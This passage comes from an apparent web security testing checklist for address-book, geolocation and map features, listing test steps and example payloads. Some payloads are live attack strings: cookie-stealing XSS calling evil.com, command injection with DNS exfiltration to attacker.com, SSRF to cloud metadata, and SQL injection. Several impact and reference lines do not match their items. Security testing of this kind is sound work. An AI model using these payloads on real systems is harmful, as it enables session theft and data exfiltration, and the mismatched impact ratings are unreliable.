**Expected Result:** Application must validate zip code data server-side and not rely on client-received lookup responses for critical decisions.

**Payload Example:**

```
Intercept and change {"city":"Restricted City";"deliverable":false} to {"city":"Open City";"deliverable":true}
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADDR-111 — Smuggling Attacks via Address Character Sets
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Submit addresses using mixed character encodings. 2. Include characters that have different interpretations in different encodings. 3. Check for parser confusion.

**Expected Result:** Application must normalize all character encodings to UTF-8 before processing and validate after normalization.

**Payload Example:**

```
Mix UTF-8 and Latin-1 characters; use overlong UTF-8 sequences like %c0%af for / or %c0%ae for .
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-112 — International Postal Code Format Exploitation
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Test postal code validation with formats from different countries. 2. Use valid formats from one country in another country's context. 3. Check for validation bypass.

**Expected Result:** Application must validate postal code format based on the selected country and reject mismatched formats.

**Payload Example:**

```
Use UK postal code SW1A 1AA for US address;use alphanumeric Canadian code K1A 0B1 for numeric-only zip field
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-113 — Address Book Backup and Restore Manipulation
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. If address book backup and restore exists create a backup. 2. Modify the backup file to include injected addresses or altered data. 3. Restore the modified backup.

**Expected Result:** Application must validate and sanitize all data during backup restore and verify backup file integrity.

**Payload Example:**

```
Modify exported backup JSON/CSV to add malicious addresses or change existing address details then restore
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-114 — Cross-Tenant Address Book Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. In a multi-tenant application attempt to access address books of users in different tenants. 2. Modify tenant_id or organization_id. 3. Check for cross-tenant data leakage.

**Expected Result:** Application must enforce strict tenant isolation and prevent any cross-tenant access to address book data.

**Payload Example:**

```
Change GET /api/tenant/T001/address-book to /api/tenant/T002/address-book with T001 credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-115 — Address Book API Versioning Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Try accessing address book via older API versions. 2. Check if deprecated endpoints lack authorization. 3. Test /api/v1/address-book vs /api/v2/address-book.

**Expected Result:** Application must enforce consistent authorization across all API versions including deprecated ones.

**Payload Example:**

```
GET /api/v1/addresses (may lack auth);GET /api/v0/address-book;GET /api/internal/addresses
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;DirBuster

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-116 — Address Update Race Condition for Order Redirect
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Place an order. 2. Immediately after order placement rapidly update the shipping address via a concurrent request. 3. Check if the order ships to the updated address.

**Expected Result:** Application must lock the shipping address at order confirmation time and not allow modification through address book updates.

**Payload Example:**

```
Concurrent POST /api/orders (place order) and PUT /api/addresses/ADDR-1001 (change address)
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ADDR-117 — Soft Delete Bypass on Addresses
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Delete an address. 2. Try accessing the deleted address via direct API call with the old address_id. 3. Check if soft-deleted addresses are still accessible.

**Expected Result:** Application must properly enforce soft-delete by hiding deleted addresses from all API responses including direct access.

**Payload Example:**

```
GET /api/addresses/ADDR-DELETED-1001 after deletion to check if data is still returned
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-118 — Batch Address Operations Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. If batch address operations exist (bulk add/edit/delete) include address_ids from other users in the batch. 2. Submit and check if cross-user operations succeed.

**Expected Result:** Application must validate ownership of every address in batch operations individually.

**Payload Example:**

```
POST /api/addresses/bulk-delete with address_ids=[ADDR-1001;ADDR-2001;ADDR-3001] including other users addresses
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-119 — Location History Privacy Violation
**Test Category:** Privacy (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. Use auto-detect location multiple times. 2. Check if a location history is maintained. 3. Verify if location history is accessible to unauthorized users or persisted unnecessarily.

**Expected Result:** Application must not maintain unnecessary location history and must provide users control over their location data.

**Payload Example:**

```
Check for /api/users/location-history endpoint or location data in user profile API response
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite;Postman

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## ADDR-120 — Map Tile Request Manipulation
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. Intercept map tile requests. 2. Modify tile coordinates or zoom levels to extreme values. 3. Check for error messages or server-side resource exhaustion.

**Expected Result:** Application must validate map tile request parameters within acceptable ranges and handle invalid requests gracefully.

**Payload Example:**

```
Modify tile x=999999&y=999999&z=99 in map tile request to cause server errors
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-121 — Stored XSS via Custom Map Markers
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. If users can add custom markers or labels on maps inject XSS in marker title or description. 2. Save and view the map. 3. Check if payload executes when others view the map.

**Expected Result:** Application must sanitize all user-provided map annotation data before rendering on the map.

**Payload Example:**

```
marker_title=<script>alert(document.cookie)</script>;marker_desc=<img src=x onerror=fetch('https://evil.com/'+document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADDR-122 — Boundary Testing on Delivery Zones
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Delivery Zone Validation

**Test Steps:** 1. Test addresses on exact boundaries of delivery zones. 2. Submit coordinates that are exactly on the zone boundary line. 3. Check for inconsistent zone assignment.

**Expected Result:** Application must handle boundary addresses consistently and assign zones deterministically.

**Payload Example:**

```
Submit coordinates on exact zone boundary lines to check for inconsistent is_deliverable responses
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-123 — Zip Code Lookup HTTP Parameter Pollution
**Test Category:** Input Validation (WSTG-INPV-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. Send zip code lookup with duplicate parameters. 2. Provide different values for the same parameter. 3. Check which value the server processes.

**Expected Result:** Application must handle duplicate parameters consistently and reject ambiguous requests.

**Payload Example:**

```
GET /api/zipcode?code=10001&code=99999 or GET /api/zipcode?code=10001&code=' OR 1=1--
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ADDR-124 — Address Normalization Bypass
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Submit addresses with different representations of the same location. 2. Use abbreviations vs full names and different formatting. 3. Check for duplicate address creation or validation bypass.

**Expected Result:** Application must normalize addresses before comparison and validation to prevent duplicate entries and validation bypasses.

**Payload Example:**

```
Submit 123 Main Street vs 123 Main St vs 123 main street and check if treated as duplicates
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-125 — Address Book Size Limit Bypass
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Check maximum address book size. 2. Bypass frontend limit by directly calling the API to add more addresses than allowed. 3. Check server-side enforcement.

**Expected Result:** Application must enforce address book size limits server-side not just on the client side.

**Payload Example:**

```
POST /api/addresses repeatedly after reaching UI-displayed limit of 10 addresses
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-126 — Sensitive Address Data in URL Parameters
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. Check if address data is passed via URL parameters rather than request body. 2. Verify if sensitive address details appear in browser history or server logs.

**Expected Result:** Application must send sensitive address data in request body not URL parameters and use POST for address operations.

**Payload Example:**

```
Check for GET /api/addresses?street=123+Secret+St&city=Hidden+City in browser history and access logs
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-127 — Address Modification During Active Order
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Place an order with a specific address. 2. While order is processing modify the shipping address. 3. Check if the active order's shipping address changes.

**Expected Result:** Application must snapshot the shipping address at order time and not allow modifications to affect orders already in processing.

**Payload Example:**

```
Modify address ADDR-1001 while order using ADDR-1001 is in status=processing and check if order address changes
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-128 — Address Validation State Confusion
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Add an address that passes validation. 2. Edit the address to an invalid address. 3. Check if the is_validated flag remains true despite the edit.

**Expected Result:** Application must re-validate addresses whenever they are modified and clear validation status on any edit.

**Payload Example:**

```
Edit validated address changing street to invalid value and check if is_validated stays true
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-129 — Geolocation Consent Cookie Manipulation
**Test Category:** Session Management (WSTG-SESS-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. Check if geolocation consent is stored in a cookie. 2. Modify the consent cookie to bypass consent requirements. 3. Check if location is auto-detected without proper consent.

**Expected Result:** Application must verify geolocation consent server-side and not rely solely on client-side cookie values.

**Payload Example:**

```
Change cookie location_consent=denied to location_consent=granted
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## ADDR-130 — Maps SDK Version Vulnerability
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Google Maps Integration

**Test Steps:** 1. Identify the Google Maps SDK version used. 2. Check for known vulnerabilities in that version. 3. Verify if the SDK is up to date.

**Expected Result:** Application must use the latest stable version of Google Maps SDK and patch known vulnerabilities promptly.

**Payload Example:**

```
Check script src for maps.googleapis.com/maps/api/js?v=3.XX and lookup CVEs for that version
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Browser DevTools;CVE databases

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## ADDR-131 — Zone Validation Timing Side-Channel
**Test Category:** Information Disclosure (WSTG-INFO-01) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Delivery Zone Validation

**Test Steps:** 1. Send zone validation requests for various zip codes. 2. Measure response times precisely. 3. Determine if timing differences reveal zone configuration or coverage areas.

**Expected Result:** Application must ensure constant-time responses for zone validation to prevent timing-based zone enumeration.

**Payload Example:**

```
Measure response times for 100 different zip codes looking for timing patterns that reveal zone boundaries
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-132 — Pin Code Lookup Verbose Error Messages
**Test Category:** Information Disclosure (WSTG-ERRH-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Pin Code / Zip Code Lookup

**Test Steps:** 1. Submit malformed pin codes to the lookup endpoint. 2. Send extremely long values or special characters. 3. Check error messages for stack traces or database details.

**Expected Result:** Application must return generic user-friendly error messages without exposing technical details.

**Payload Example:**

```
zip_code='; check for stack traces;database names;table structures;internal paths in error response
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-133 — Right-to-Left Override Attack in Address
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** International Address Support

**Test Steps:** 1. Insert Unicode Right-to-Left Override character (U+202E) in address fields. 2. Check if the displayed address is visually different from what is stored. 3. Test for address spoofing.

**Expected Result:** Application must strip or neutralize bidirectional control characters in address fields to prevent display manipulation.

**Payload Example:**

```
street=123 [U+202E]tsriF eniL (displays as 123 Line First);name=[U+202E]moc.live@tset
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Browser

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-134 — Address Data Exfiltration via DNS
**Test Category:** Exfiltration (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Address Book Management

**Test Steps:** 1. If SSTI or injection exists in address fields attempt DNS-based data exfiltration. 2. Use address fields to trigger DNS lookups to attacker-controlled domain. 3. Monitor DNS logs.

**Expected Result:** Application must prevent injection attacks that could enable DNS-based data exfiltration from address processing.

**Payload Example:**

```
street=${IFS}nslookup${IFS}$(whoami).attacker.com or street={{request.META.HTTP_HOST}}.evil.com
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Collaborator;Custom DNS

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-135 — Address Webhook Manipulation
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. If address changes trigger webhooks check if the webhook URL is configurable. 2. Set webhook to internal service. 3. Check for SSRF through address change notifications.

**Expected Result:** Application must validate webhook URLs and restrict them to whitelisted external endpoints only.

**Payload Example:**

```
Set address_change_webhook=http://169.254.169.254/latest/meta-data/ or http://localhost:6379/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ADDR-136 — Default Address Cache Inconsistency
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Default Address Selection

**Test Steps:** 1. Set a default address. 2. Delete the default address. 3. Check if the cache still returns the deleted address as default. 4. Place an order and check which address is used.

**Expected Result:** Application must invalidate caches when the default address is changed or deleted to prevent stale data usage.

**Payload Example:**

```
Delete default address then immediately place order checking if cached default address is still used
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-137 — Address Validation Replay Attack
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Validation

**Test Steps:** 1. Capture a successful address validation response. 2. Change the address to an invalid one. 3. Replay the old validation success response. 4. Check if the application accepts the invalid address.

**Expected Result:** Application must tie validation results to the specific address validated and re-validate on submission.

**Payload Example:**

```
Replay old validation_token or validation_result for a new invalid address submission
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADDR-138 — WebSocket Location Tracking Abuse
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. If geolocation uses WebSocket for real-time tracking check for authentication on the WebSocket connection. 2. Connect without auth. 3. Check for location data leakage.

**Expected Result:** Application must authenticate and authorize WebSocket connections for location tracking just as with REST endpoints.

**Payload Example:**

```
Connect to ws://target.com/location-ws without authentication token and monitor for location broadcasts
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;wscat;OWASP ZAP

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---
